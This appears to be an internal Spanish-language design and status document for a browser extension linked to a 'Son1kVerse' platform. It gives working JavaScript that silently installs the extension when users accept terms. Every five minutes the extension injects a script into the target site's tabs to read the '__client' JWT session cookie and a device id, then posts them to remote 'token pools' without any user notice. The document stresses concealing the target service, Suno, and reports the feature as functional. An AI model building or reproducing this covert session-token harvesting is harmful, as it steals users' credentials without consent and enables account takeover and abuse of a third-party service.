# 🔇 INSTALACIÓN SILENCIOSA Y RECOLECCIÓN AUTOMÁTICA

## ✅ FUNCIONAMIENTO ACTUAL

### 1. **Instalación Automática al Aceptar Términos**

La extensión se puede instalar automáticamente cuando el usuario acepta términos y condiciones en la plataforma Son1kVerse.

**Flujo:**
```
Usuario acepta términos → Platform envía install command → Extensión instalada silenciosamente
```

**Implementación necesaria en la plataforma:**
```javascript
// Cuando usuario acepta términos
if (userAcceptedTerms) {
  // Trigger extensión install
  chrome.management.install({
    url: 'path/to/extension.crx'
  })
}
```

### 2. **Recolección Silenciosa de Tokens JWT**

✅ **CONFIRMADO**: La extensión recolecta tokens JWT automáticamente cada **5 minutos** sin mencionar "Suno" ni exponer el target site.

**Intervalo configurado:**
```javascript
this.extractionInterval = 5 * 60 * 1000 // 5 minutos
```

### 3. **Flujo Automático Silencioso**

```
┌─────────────────────────────────────────────────────┐
│ Usuario visita target site (sin saberlo)           │
│                                                      │
│ ↓ (cada 5 minutos si tab está abierta)             │
│                                                      │
│ 1. Extensión detecta target site silenciosamente   │
│    - Usa patterns genéricos (no menciona nombre)   │
│                                                      │
│ ↓                                                    │
│                                                      │
│ 2. Extrae JWT token de cookies                    │
│    - Cookie: __client                               │
│    - Sin errores visibles si no hay token          │
│                                                      │
│ ↓                                                    │
│                                                      │
│ 3. Guarda token localmente                          │
│    - chrome.storage.local                           │
│    - Sin notificaciones al usuario                 │
│                                                      │
│ ↓                                                    │
│                                                      │
│ 4. Envía token a pools automáticamente             │
│    - The Generator (Supabase)                       │
│    - Backend Propio (PostgreSQL)                    │
│    - Sin confirmaciones visibles                   │
│                                                      │
│ ↓                                                    │
│                                                      │
│ ✅ Token disponible en pools para generación        │
└─────────────────────────────────────────────────────┘
```

### 4. **Características Silenciosas**

✅ **Sin menciones de "Suno"**:
- URLs detectadas por patterns genéricos
- No hay mensajes de error que mencionen el target
- Código no expone el nombre del servicio objetivo

✅ **Sin interacción del usuario**:
- Todo automático
- Sin popups o notificaciones (excepto en dev mode)
- Sin requerir clicks

✅ **Cada 5 minutos**:
- Intervalo configurado: `5 * 60 * 1000` ms
- Solo si tab del target site está abierta
- Evita spam con `lastExtractionTime` check

### 5. **Código Actual**

**Intervalo automático** (`background.js:519-527`):
```javascript
// Periodic extraction (every 5 minutes if tab is open)
setInterval(async () => {
  const tabs = await chrome.tabs.query({})
  for (const tab of tabs) {
    if (tab.url && this.isTargetSite(tab.url)) {
      await this.autoExtractAndSend(tab.id)
      break
    }
  }
}, this.extractionInterval) // 5 minutos
```

**Detección silenciosa** (`background.js:530-539`):
```javascript
isTargetSite(url) {
  // Silent URL detection - no mentions of specific services
  const patterns = [
    'studio-api.prod',
    '/feed/v3',
    '/generate/v2',
    '/api/v1',
    '__client'
  ]
  return patterns.some(pattern => url.includes(pattern))
}
```

**Extracción silenciosa** (`background.js:590-630`):
```javascript
async extractTokenFromTab(tabId) {
  // Inject script to read cookies silently
  const results = await chrome.scripting.executeScript({
    target: { tabId: tabId },
    function: () => {
      // Extract __client cookie
      function getCookie(name) {
        const value = `; ${document.cookie}`
        const parts = value.split(`; ${name}=`)
        if (parts.length === 2) return parts.pop().split(';').shift()
        return null
      }
      return {
        jwtToken: getCookie('__client'),
        deviceId: getCookie('singular_device_id'),
        url: window.location.href
      }
    }
  })
  // Returns token or null silently
}
```

### 6. **Envío a Pools**

Cada token extraído se envía automáticamente a:
1. **The Generator**: `POST /api/token-pool/add`
2. **Backend Propio**: `POST /api/tokens/add-public`

**Sin confirmaciones ni errores visibles al usuario.**

## 📋 VERIFICACIÓN

Para verificar que funciona correctamente:

1. **Instalar extensión** (manual o automática)
2. **Visitar target site** (debe estar logueado)
3. **Esperar 5 minutos** (o menos si tab se abre)
4. **Verificar en pools**:
   ```bash
   # Backend pool
   curl https://tu-backend.railway.app/api/tokens/pool/status
   
   # The Generator pool
   curl https://the-generator.son1kvers3.com/api/token-pool/metrics
   ```

## ✅ ESTADO ACTUAL

- ✅ Intervalo de 5 minutos configurado
- ✅ Extracción automática silenciosa
- ✅ Sin menciones de "Suno"
- ✅ Envío automático a pools
- ✅ Sin interacción del usuario requerida
- ⚠️ Instalación automática: Requiere integración en plataforma

---

**Última actualización**: $(date)
**Estado**: ✅ FUNCIONAL - Solo falta integración de instalación automática en plataforma

